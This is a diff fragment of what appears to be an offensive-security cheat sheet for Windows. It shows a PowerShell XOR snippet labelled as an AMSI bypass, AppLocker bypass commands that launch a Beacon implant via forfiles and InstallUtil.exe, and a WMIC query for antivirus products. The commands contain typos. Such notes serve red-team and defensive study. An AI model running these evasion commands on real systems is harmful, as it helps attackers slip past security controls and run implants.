@@ -47,10 +47,11 @@ Powershell Encoding (AMSI Bypass)
     foreach($byte in [Text.Encoding]::UTF8.GetBytes($malicious)){ $encrypted += $byte -bxor 1 }
     [Test.Encoding]::UTF8.GetString($decrypted)
   
-Poweshell Contrained Language Mode
+Applocker Bypass
   Put Beacon on disk and run the following
   forfile /p C:\Windows\System32 /m calc.exe /c 'path_to_beacon.exe'
-  example: forfile /p C:\Windows\System32 /m ping.exe /c 'c:\windows\temp\beacon.exe'
+  	example: forfile /p C:\Windows\System32 /m ping.exe /c 'c:\windows\temp\beacon.exe'
+  InstallUtil.exe /logfile= /LogToConsole=false /U file.dll or file.exe
   
 Antivirus Info
   WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
